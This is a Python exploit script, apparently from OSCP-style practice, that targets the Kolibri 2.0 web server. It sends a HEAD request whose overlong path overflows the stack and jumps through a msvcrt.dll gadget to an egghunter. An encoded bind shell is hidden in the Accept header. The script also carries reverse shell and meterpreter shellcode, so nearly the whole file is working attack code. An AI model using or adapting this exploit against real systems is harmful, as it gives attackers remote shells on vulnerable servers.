#######
# Exploit kolibri version 2.0
########
import sys
import os
import struct
 
usage = (
"\n  Usage: kolibrisploit.py host port \n\n"
)
 
if len(sys.argv) < 3:
    print usage
    sys.exit(0)
 
host = sys.argv[1]
 
try:
    port = int(sys.argv[2])
except ValueError:
    print "  [-] Error: port must be numeric!"
    sys.exit(1)
 
#step 1: buffer = "A" * (600)
#step 2: buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

#0x77c21025 : push esp # ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\msvcrt.dll)

shellcode = ("\x31\xC9"
"\x51"
"\x68\x63\x61\x6C\x63"
"\x54"  
"\xB8\xC7\x93\xBF\x77"
"\xFF\xD0")
egg =("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x4f\x53\x43\x50\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

bind_shell=(
"\xbb\xa9\x58\xa1\xec\xda\xcf\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x53\x31\x5e\x12\x03\x5e\x12\x83\x6f\x5c\x43\x19\x93\xb5\x01"
"\xe2\x6b\x46\x66\x6a\x8e\x77\xa6\x08\xdb\x28\x16\x5a\x89\xc4"
"\xdd\x0e\x39\x5e\x93\x86\x4e\xd7\x1e\xf1\x61\xe8\x33\xc1\xe0"
"\x6a\x4e\x16\xc2\x53\x81\x6b\x03\x93\xfc\x86\x51\x4c\x8a\x35"
"\x45\xf9\xc6\x85\xee\xb1\xc7\x8d\x13\x01\xe9\xbc\x82\x19\xb0"
"\x1e\x25\xcd\xc8\x16\x3d\x12\xf4\xe1\xb6\xe0\x82\xf3\x1e\x39"
"\x6a\x5f\x5f\xf5\x99\xa1\x98\x32\x42\xd4\xd0\x40\xff\xef\x27"
"\x3a\xdb\x7a\xb3\x9c\xa8\xdd\x1f\x1c\x7c\xbb\xd4\x12\xc9\xcf"
"\xb2\x36\xcc\x1c\xc9\x43\x45\xa3\x1d\xc2\x1d\x80\xb9\x8e\xc6"
"\xa9\x98\x6a\xa8\xd6\xfa\xd4\x15\x73\x71\xf8\x42\x0e\xd8\x95"
"\xa7\x23\xe2\x65\xa0\x34\x91\x57\x6f\xef\x3d\xd4\xf8\x29\xba"
"\x1b\xd3\x8e\x54\xe2\xdc\xee\x7d\x21\x88\xbe\x15\x80\xb1\x54"
"\xe5\x2d\x64\xc0\xed\x88\xd7\xf7\x10\x6a\x88\xb7\xba\x03\xc2"
"\x37\xe5\x34\xed\x9d\x8e\xdd\x10\x1e\xa1\x41\x9c\xf8\xab\x69"
"\xc8\x53\x43\x48\x2f\x6c\xf4\xb3\x05\xc4\x92\xfc\x4f\xd3\x9d"
"\xfc\x45\x73\x09\x77\x8a\x47\x28\x88\x87\xef\x3d\x1f\x5d\x7e"
"\x0c\x81\x62\xab\xe6\x22\xf0\x30\xf6\x2d\xe9\xee\xa1\x7a\xdf"
"\xe6\x27\x97\x46\x51\x55\x6a\x1e\x9a\xdd\xb1\xe3\x25\xdc\x34"
"\x5f\x02\xce\x80\x60\x0e\xba\x5c\x37\xd8\x14\x1b\xe1\xaa\xce"
"\xf5\x5e\x65\x86\x80\xac\xb6\xd0\x8c\xf8\x40\x3c\x3c\x55\x15"
"\x43\xf1\x31\x91\x3c\xef\xa1\x5e\x97\xab\xd2\x14\xb5\x9a\x7a"
"\xf1\x2c\x9f\xe6\x02\x9b\xdc\x1e\x81\x29\x9d\xe4\x99\x58\x98"
"\xa1\x1d\xb1\xd0\xba\xcb\xb5\x47\xba\xd9"
)

reverse_shell=(
"\xbf\xb2\x1d\xbb\xb7\xda\xcd\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x59\x83\xeb\xfc\x31\x7b\x10\x03\x7b\x10\x50\xe8\x47\x5f\x1b"
"\x13\xb8\xa0\x43\x9d\x5d\x91\x51\xf9\x16\x80\x65\x89\x7b\x29"
"\x0e\xdf\x6f\xba\x62\xc8\x80\x0b\xc8\x2e\xae\x8c\xfd\xee\x7c"
"\x4e\x9c\x92\x7e\x83\x7e\xaa\xb0\xd6\x7f\xeb\x06\x9c\x90\xa1"
"\xcf\xd5\x3c\x56\x7b\xab\xfc\x57\xab\xa7\xbc\x2f\xce\x78\x48"
"\x9c\xd1\xa8\x3b\x44\xf2\xc3\x73\x6d\xa2\xd2\x50\x08\x8b\xa1"
"\x6a\x22\xf3\x03\x19\x70\x80\x95\xcb\x48\x56\x54\x3c\xa7\xfa"
"\x56\x05\x80\xe2\x2c\x7d\xf2\x9f\x36\x46\x88\x7b\xb2\x58\x2a"
"\x0f\x64\xbc\xca\xdc\xf3\x37\xc0\xa9\x70\x1f\xc5\x2c\x54\x14"
"\xf1\xa5\x5b\xfa\x73\xfd\x7f\xde\xd8\xa5\x1e\x47\x85\x08\x1e"
"\x97\x61\xf4\xba\xdc\x80\xe3\xbb\x1d\x5b\x0c\xe6\x89\x97\xc1"
"\x19\x49\xb0\x52\x69\x7b\x1f\xc9\xe5\x37\xe8\xd7\xf2\x4e\xfe"
"\xe7\x2d\xe8\x6f\x16\xce\x08\xb9\xdd\x9a\x58\xd1\xf4\xa2\x33"
"\x21\xf8\x76\xa9\x2b\x6e\xd5\x2d\x25\x63\x4d\x2f\x35\x6a\xd1"
"\xa6\xd3\xdc\xb9\xe8\x4b\x9d\x69\x48\x3c\x75\x60\x47\x63\x65"
"\x8b\x82\x0c\x0c\x64\x7a\x64\xb9\x1d\x27\xfe\x58\xe1\xf2\x7a"
"\x5a\x69\xf6\x7b\x15\x9a\x73\x68\x42\xfd\x7b\x70\x93\x68\x7b"
"\x1a\x97\x3a\x2c\xb2\x95\x1b\x1a\x1d\x65\x4e\x19\x5a\x99\x0f"
"\x2b\x10\xac\x85\x13\x4e\xd1\x49\x93\x8e\x87\x03\x93\xe6\x7f"
"\x70\xc0\x13\x80\xad\x75\x88\x15\x4e\x2f\x7c\xbd\x26\xcd\x5b"
"\x89\xe8\x2e\x8e\x89\xef\xd0\x4c\xa6\x57\xb8\xae\xf6\x67\x38"
"\xc5\xf6\x37\x50\x12\xd8\xb8\x90\xdb\xf3\x90\xb8\x56\x92\x53"
"\x59\x66\xbf\x32\xc7\x67\x4c\xef\xf8\x12\x3d\x10\xf9\xe2\x57"
"\x75\xfa\xe2\x57\x8b\xc7\x34\x6e\xf9\x06\x85\xd5\xf2\x3d\xa8"
"\x7c\x99\x3d\xfe\x7f\x88"
)
meterpreter_shell=(
"\xdd\xc7\xb8\x1a\xf3\x7b\x35\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x59\x31\x46\x19\x83\xc6\x04\x03\x46\x15\xf8\x06\x87\xdd\x73"
"\xe8\x78\x1e\xeb\xd8\xaa\x7a\x60\x48\x7b\x08\x24\x61\xf0\x5c"
"\xdc\xf0\xe3\x50\x23\x89\x9e\xba\xd4\x39\x14\x9d\xdb\x85\x05"
"\xdd\x7a\x7a\x54\x32\x5c\x43\x97\x47\x9d\x84\x61\x2d\x72\x58"
"\xf9\x9f\x9c\xd6\xbf\x23\xcb\xe9\xef\xd7\xb3\x91\x8a\x28\x47"
"\x2e\x94\x78\xf7\x25\xde\x60\x7c\x61\xff\x91\x51\x17\x36\xe5"
"\x69\x29\x36\x4f\x1a\x7d\x43\x51\xca\x4f\x93\x93\x3d\xa2\xbf"
"\x15\x06\x85\x5f\x60\x7c\xf5\xe2\x73\x47\x87\x38\xf1\x57\x2f"
"\xca\xa1\xb3\xd1\x1f\x37\x30\xdd\xd4\x33\x1e\xc2\xeb\x90\x15"
"\xfe\x60\x17\xf9\x76\x32\x3c\xdd\xd3\xe0\x5d\x44\xbe\x47\x61"
"\x96\x66\x37\xc7\xdd\x85\x2e\x77\x1e\x56\x4f\x25\x88\x9a\x82"
"\xd6\x48\xb5\x95\xa5\x7a\x1a\x0e\x22\x36\xd3\x88\xb5\x4f\xf3"
"\x2a\x69\xf7\x94\xd4\x8a\x07\xbc\x12\xde\x57\xd6\xb3\x5f\x3c"
"\x26\x3b\x8a\xa8\x2c\xab\x99\x2c\x38\x26\x8a\x2e\x3a\x29\x16"
"\xa7\xdc\x19\xf6\xe7\x70\xda\xa6\x47\x21\xb2\xac\x48\x1e\xa2"
"\xce\x83\x37\x49\x21\x7d\x6f\xe6\xd8\x24\xfb\x97\x25\xf3\x81"
"\x98\xae\xf1\x76\x56\x47\x70\x65\x8f\x30\x7a\x75\x50\xd5\x7a"
"\x1f\x54\x7f\x2d\xb7\x56\xa6\x19\x18\xa8\x8d\x1a\x5f\x56\x50"
"\x2a\x2b\x61\xc6\x12\x43\x8e\x06\x92\x93\xd8\x4c\x92\xfb\xbc"
"\x34\xc1\x1e\xc3\xe0\x76\xb3\x56\x0b\x2e\x67\xf0\x63\xcc\x5e"
"\x36\x2c\x2f\xb5\x44\x2b\xcf\x4b\x63\x94\xa7\xb3\x33\x24\x37"
"\xde\xb3\x74\x5f\x15\x9b\x7b\xaf\xd6\x36\xd4\xa7\x5d\xd7\x96"
"\x56\x61\xf2\x77\xc6\x62\xf1\xa3\xf9\x19\x7a\x53\xfa\xdd\x92"
"\x30\xfb\xdd\x9a\x46\xc0\x0b\xa3\x3c\x07\x88\x90\x4f\x32\xad"
"\xb1\xc5\x3c\xe1\xc2\xcf"
)

buffer = "A"*515
buffer += struct.pack("<L", 0x77c21025)
buffer += egg
buffer += "C"*(600 -len(buffer))

#pattern= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
print len(buffer) 

req = ("HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 \r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 OSCPOSCP"+bind_shell+"\r\n"
"Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n"
"Accept-Encoding: gzip,deflate\r\n"
"Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
print "  [+] Connecting to %s:%d" % (host, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
 
print "  [+] Sending payload.."
s.send(req)
data = s.recv(1024)
 
print "  [+] Closing connection.."
s.close()
 
print "  [+] Done!"

